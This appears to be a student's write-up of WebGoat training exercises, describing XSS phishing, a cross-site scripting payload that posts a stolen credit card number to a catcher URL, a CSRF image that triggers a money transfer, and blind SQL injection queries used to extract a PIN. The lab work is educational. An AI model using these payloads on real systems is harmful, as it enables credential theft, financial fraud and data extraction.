Part 1 Explanation:
First I would let the user search my script. My script would create a user name and password interface by user's search. After user typed their user name and password if they clicked the submit button that information would be sent to the attacker's server.

The vulnerability is when users search for something that thing could be displayed by the HTML. Therefore we can write some HTML script that would be executed by the HTML.

After the user clicks the search button and sees the login interface, they would mistakenly think it is required for their search.


Part 2 Explanation:
The decoded URL is as following:
"
http://localhost:8090/WebGoat/start.mvc#attack/1731484628/900?input1=123&input2=<script>
var card_arr = document.getElementsByName("input1");
var credURL="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard="+card_arr[0].value; 
var xmlHTTP = new XMLHttpRequest(); 
xmlHTTP.open("POST",credURL, false); 
xmlHTTP.send(null);
var message = document.getElementById('message');
message.innerHTML =  "";
</script>
"
The entry that lets the user input their three-digit number is exploitable. We create the script into that input. After the user typed their information and click the purchase button. Our script would be executed which would send their information to the attacker's server. 

Part 3 Explanation:
We created a image which has a special URL. The URL have screen = 423096428 and menu = 900. The URL would transfer 5000$ from the user when the user open the image.

Part8:
101 AND ((select pin from credit where cc_number = 1234123412341234) < <Nnumber1>)
101 AND ((select pin from credit where cc_number = 1234123412341234) > <Nnumber2>)
After finding 4862, check by the command:
101 AND ((select pin from credit where cc_number = 1234123412341234) = 4862)
